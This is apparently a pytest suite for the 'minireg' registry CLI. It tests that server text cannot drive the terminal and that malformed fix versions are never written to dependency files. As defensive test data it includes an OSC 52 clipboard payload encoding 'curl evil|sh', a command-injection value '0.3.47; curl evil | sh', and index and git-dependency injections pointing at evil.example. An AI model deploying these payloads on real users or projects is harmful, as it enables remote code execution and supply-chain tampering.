"""CLI: argument parsing, terminal output and config writing hardening.

The HTTP layer is stubbed (`cli.api`), so these pin the CLI's own behaviour:
what it accepts on the command line, what it prints from server-supplied
text, and what it writes into the user's package-manager config files.
"""

from __future__ import annotations

import argparse
import importlib.util
import io
import json
import pathlib
import re
import shlex
import sys
import urllib.error

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[2]
CLI_PATH = ROOT / "cli" / "minireg.py"
_spec = importlib.util.spec_from_file_location("minireg_cli_hardening", CLI_PATH)
cli = importlib.util.module_from_spec(_spec)
sys.modules["minireg_cli_hardening"] = cli
_spec.loader.exec_module(cli)


# --------------------------------------------------------------------------- #
# Every documented command line parses
# --------------------------------------------------------------------------- #
_SHELL_FENCES = ("```bash", "```sh", "```shell", "```console")


def _shell_blocks(text: str):
    """The bodies of the shell code blocks in a markdown file."""
    block: list[str] | None = None
    for line in text.splitlines():
        if line.startswith("```"):
            if block is None and line.strip() in _SHELL_FENCES:
                block = []
            elif block is not None:
                yield "\n".join(block)
                block = None
            # Any other fence opens or closes a non-shell block; its body is
            # skipped because `block` stays None until the next shell fence.
        elif block is not None:
            block.append(line)


def documented_command_lines() -> list[str]:
    """`minireg ...` invocations from the docs, the README, the parser's own
    epilog and the hints the CLI prints when it gives up."""
    found: list[str] = []
    for doc in sorted([*(ROOT / "docs").glob("*.md"), ROOT / "README.md"]):
        for block in _shell_blocks(doc.read_text()):
            for line in block.replace("\\\n", " ").splitlines():
                line = line.strip().removeprefix("$ ")
                for part in re.split(r"&&|\|\||;|\|", line):
                    part = part.strip()
                    if part.startswith("minireg "):
                        found.append(part)
    for line in (cli.build_parser().epilog or "").splitlines():
        if line.strip().startswith("minireg "):
            found.append(line.strip())
    # Hints such as "Run: minireg login --url https://registry.example.com".
    found += re.findall(r"Run: (minireg [^\"'\n]+)", CLI_PATH.read_text())
    return found


def test_the_documented_commands_were_found():
    lines = documented_command_lines()
    # The ones that used to be rejected, so a broken extractor cannot pass
    # the parse test below by finding nothing.
    assert "minireg login --url https://registry.example.com" in lines
    assert any(line.startswith("minireg audit --refresh") for line in lines)
    assert len(lines) > 30


@pytest.mark.parametrize("line", documented_command_lines())
def test_every_documented_command_parses(line):
    argv = shlex.split(line, comments=True)[1:]
    try:
        cli.build_parser().parse_args(argv)
    except SystemExit as exc:  # argparse's way of saying "unrecognised"
        pytest.fail(f"{line!r} does not parse (exit {exc.code})")


class TestGlobalFlagsAfterTheCommand:
    def test_url_and_insecure_follow_any_command(self):
        p = cli.build_parser()
        a = p.parse_args(["login", "--url", "https://reg.example", "--insecure"])
        assert a.url == "https://reg.example" and a.insecure is True
        a = p.parse_args(["audit", "--insecure"])
        assert a.insecure is True

    def test_a_subcommand_does_not_reset_the_top_level_values(self):
        """The subcommand's copies default to SUPPRESS: without that, a bare
        `minireg --url X whoami` would come back with url=None."""
        a = cli.build_parser().parse_args(["--url", "https://reg.example", "--insecure", "whoami"])
        assert a.url == "https://reg.example" and a.insecure is True
        a = cli.build_parser().parse_args(["whoami"])
        assert a.url is None and a.insecure is False

    def test_login_uses_the_url_given_after_the_command(self, monkeypatch, tmp_path):
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
        monkeypatch.delenv("MINIREG_URL", raising=False)
        seen = []

        def fake_api(registry, path, *a, **k):
            seen.append(registry)
            raise cli.ApiError(0, "stop here")

        monkeypatch.setattr(cli, "api", fake_api)
        args = cli.build_parser().parse_args(["login", "--url", "https://reg.example/"])
        with pytest.raises(SystemExit):
            args.func(args)
        assert seen == ["https://reg.example"]


class TestAuditRefresh:
    def test_refresh_is_sent_to_the_server(self, monkeypatch):
        bodies = []

        def fake_api(registry, path, method="GET", body=None, **kwargs):
            bodies.append(body)
            return {"checked": 1, "findings": [], "unscanned": [], "unscanned_total": 0}

        monkeypatch.setattr(cli, "api", fake_api)
        pkgs = [{"name": "a", "version": "1.0.0"}]
        args = cli.build_parser().parse_args(["audit", "--refresh"])
        cli.audit_request("http://reg", "t", "npm", pkgs, args)
        args = cli.build_parser().parse_args(["audit"])
        cli.audit_request("http://reg", "t", "npm", pkgs, args)
        assert [b["refresh"] for b in bodies] == [True, False]

    def test_refresh_and_offline_contradict_each_other(self):
        with pytest.raises(SystemExit):
            cli.build_parser().parse_args(["audit", "--offline", "--refresh"])


# --------------------------------------------------------------------------- #
# Server-supplied text cannot drive the terminal
# --------------------------------------------------------------------------- #
#: OSC 52 (write the clipboard), then erase the line and return to its start,
#: then the 8-bit CSI form. A terminal shown this prints only "looks fine".
EVIL = "harmless\x1b]52;c;Y3VybCBldmlsfHNo\x07\x1b[2K\r\x9b2Klooks fine"


class _Response:
    def __init__(self, payload):
        self._body = json.dumps(payload).encode()
        self.headers = {}

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


@pytest.fixture
def server(monkeypatch, tmp_path):
    """Serve canned JSON through the CLI's real `api()`, from urlopen down."""
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
    monkeypatch.delenv("MINIREG_TOKEN", raising=False)
    monkeypatch.delenv("MINIREG_URL", raising=False)
    cli.save_config({"registry": "https://reg.example", "token": "t"})
    routes = {}

    def fake_urlopen(request, timeout=None, context=None):
        path = request.full_url.split("reg.example", 1)[1]
        for prefix, answer in routes.items():
            if path.startswith(prefix):
                if isinstance(answer, Exception):
                    raise answer
                return _Response(answer)
        raise AssertionError(f"unexpected request {path}")

    monkeypatch.setattr(cli.urllib.request, "urlopen", fake_urlopen)
    return routes


def assert_inert(text):
    assert "\x1b" not in text and "\x9b" not in text and "\r" not in text and "\x07" not in text


class TestNoTerminalEscapes:
    def test_search_descriptions(self, server, capsys):
        server["/api/docker/images"] = {"images": [], "total": 0}
        server["/api/search"] = {
            "total": 1,
            "results": [
                {"ecosystem": "npm", "name": "evil-pkg", "latest_version": "1.0.0", "description": EVIL}
            ],
        }
        cli.main(["search", "evil"])
        out = capsys.readouterr().out
        assert_inert(out)
        assert "looks fine" in out

    def test_info_block_reason_and_cves_cannot_hide_lines(self, server, capsys):
        server["/api/packages/npm/evil"] = {
            "name": "evil",
            "ecosystem": "npm",
            "description": "multi\nline " + EVIL,
            "license": "MIT\x1b[8m",
            "blocked": True,
            "block_reason": "malware\x1b[1A\x1b[2K",
            "versions": [
                {"version": "1.0.0", "max_cvss": 9.8, "cves": [{"cve_id": "CVE-1\x1b]0;pwned\x07"}]},
            ],
            "upstreams": [{"name": "npmjs\x1b[2K", "web_url": "https://x\x1b[2K"}],
        }
        cli.main(["info", "evil", "--ecosystem", "npm"])
        out = capsys.readouterr().out
        assert_inert(out)
        assert "BLOCKED" in out and "malware" in out
        # A newline in a one-line field would forge a line of output.
        assert "multi line" in out

    def test_image_findings(self, server, capsys):
        server["/api/docker/inspect"] = {
            "pull_reference": "reg.example/evil:1\x1b[2K",
            "repository": "evil",
            "digest": "sha256:" + "a" * 64,
            "image": {
                "digest": "sha256:" + "a" * 64,
                "scan_status": "scanned",
                "severity_counts": {"HIGH": 1},
                "kind": "image",
            },
            "verdict": {"allowed": False, "code": "DENIED", "reason": "critical CVE\x1b[1A\x1b[2K"},
            "findings": [
                {"severity": "HIGH", "vuln_id": "CVE-2\x1b]52;c;eA==\x07", "pkg_name": "openssl\r",
                 "installed_version": "1", "fixed_version": "2\x1b[2K"},
            ],
            "findings_total": 1,
        }
        cli.main(["info", "--ecosystem", "docker", "evil:1"])
        out = capsys.readouterr().out
        assert_inert(out)
        assert "BLOCKED" in out

    def test_error_details(self, server, capsys):
        body = io.BytesIO(b"<html>\x1b]52;c;eA==\x07 down</html>")
        server["/api/search"] = urllib.error.HTTPError(
            "https://reg.example/api/search", 502, "Bad Gateway", {}, body
        )
        server["/api/docker/images"] = {"images": [], "total": 0}
        with pytest.raises(SystemExit):
            cli.main(["search", "x", "--ecosystem", "npm"])
        err = capsys.readouterr().err
        assert_inert(err)
        assert "down" in err

    def test_multiline_fields_keep_their_lines(self):
        payload = cli._clean_payload(
            {"containerd_hosts_toml": "[host]\r\n  a = 1\x1b[2K\n", "note": "a\nb"}
        )
        assert payload == {"containerd_hosts_toml": "[host]\n  a = 1[2K\n", "note": "a b"}


# --------------------------------------------------------------------------- #
# --fix never writes a malformed version
# --------------------------------------------------------------------------- #
INJECTED_PYPI = "2.31.0\n--extra-index-url https://evil.example/simple"
INJECTED_NPM = '4.17.21", "evil": "git+https://evil.example/x.git'


class TestFixVersionsAreValidated:
    def test_requirements_line_injection_is_refused(self, tmp_path):
        req = tmp_path / "requirements.txt"
        req.write_text("requests==2.19.0\n")
        text, changes = cli.plan_requirements_fix(req, {"requests": INJECTED_PYPI})
        assert text == "requests==2.19.0\n" and changes == []

    def test_package_json_key_injection_is_refused(self, tmp_path):
        pj = tmp_path / "package.json"
        original = '{\n  "dependencies": {\n    "lodash": "^4.17.0"\n  }\n}\n'
        pj.write_text(original)
        text, changes, _skipped = cli.plan_package_json_fix(pj, {"lodash": INJECTED_NPM})
        assert text == original and changes == []

    def test_valid_versions_still_apply(self, tmp_path):
        req = tmp_path / "requirements.txt"
        req.write_text("requests==2.19.0\nDjango==4.2\n")
        text, changes = cli.plan_requirements_fix(req, {"requests": "2.31.0", "django": "4.2.post1"})
        assert text == "requests==2.31.0\nDjango==4.2.post1\n" and len(changes) == 2

    def test_apply_fixes_writes_nothing_malformed(self, tmp_path, capsys, monkeypatch):
        req = tmp_path / "requirements.txt"
        req.write_text("requests==2.19.0\n")
        monkeypatch.setattr(cli, "verify_fixes", lambda *a: [])
        findings = [{"name": "requests", "version": "2.19.0", "fix_version": INJECTED_PYPI, "cves": [{}]}]
        args = argparse.Namespace(dry_run=False, yes=True, insecure=False)
        cli.apply_fixes(args, "https://reg.example", "t", tmp_path, [(req, "pypi", findings)])
        assert req.read_text() == "requests==2.19.0\n"
        assert "malformed fix version" in capsys.readouterr().err

    def test_cargo_advice_never_prints_a_command_injection(self, tmp_path, capsys):
        printed = cli._print_cargo_fix_advice(
            tmp_path / "Cargo.lock",
            [
                {"name": "time", "fix_version": "0.3.47; curl evil | sh", "cves": [{}]},
                {"name": "smallvec", "fix_version": "1.6.1", "cves": [{}]},
            ],
        )
        out = capsys.readouterr().out
        assert printed == 1
        assert "curl" not in out and "cargo update -p smallvec --precise 1.6.1" in out


class TestServerDropsMalformedFixVersions:
    def test_lowest_clearing_version_skips_unparseable_fixes(self):
        from app.services.vulns import lowest_clearing_version

        cves = [{"fixed_version": INJECTED_PYPI}, {"fixed_version": "2.30.0"}]
        assert lowest_clearing_version("pypi", cves, "2.19.0") == "2.30.0"
        assert lowest_clearing_version("npm", [{"fixed_version": INJECTED_NPM}], "4.17.0") is None
        assert lowest_clearing_version("cargo", [{"fixed_version": "1.0.0\n"}], "0.9.0") is None
        assert lowest_clearing_version("npm", [{"fixed_version": "4.17.21"}], "4.17.0") == "4.17.21"
